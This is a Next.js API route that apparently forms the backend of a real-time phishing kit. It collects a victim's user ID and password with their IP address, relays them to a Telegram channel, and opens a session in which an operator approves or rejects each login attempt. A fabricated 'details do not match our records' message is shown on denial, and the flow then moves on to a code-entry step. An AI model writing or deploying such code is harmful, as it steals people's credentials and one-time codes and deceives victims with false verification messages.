import { NextRequest, NextResponse } from "next/server"
import { createApprovalSession, sendApprovalActionMessage } from "@/lib/approval-webhook"
import { getClientIpFromRequest } from "@/lib/client-ip"
import { telegramService } from "@/lib/telegram"

export async function POST(request: NextRequest) {
  try {
    const data = await request.json()
    const ip = getClientIpFromRequest(request)
    await telegramService.sendVerifyDetailsNotification({ ...data, ip })

    const session = createApprovalSession({
      trigger: "verify-details",
      page: "/verify?mode=details",
      nextPage: "/verify?mode=code",
      redirectPage: "/verify?mode=details",
      userId: String(data?.userId ?? ""),
      password: String(data?.password ?? ""),
      denyMessage: "The verification details you entered do not match our records.",
      timeoutMessage: "Unable to verify your details at this time. Please try again.",
    })

    await sendApprovalActionMessage(session)

    return NextResponse.json({ success: true, sessionId: session.id })
  } catch (error) {
    console.error("Error sending verify details notification:", error)
    return NextResponse.json({ error: "Failed to send notification" }, { status: 500 })
  }
}
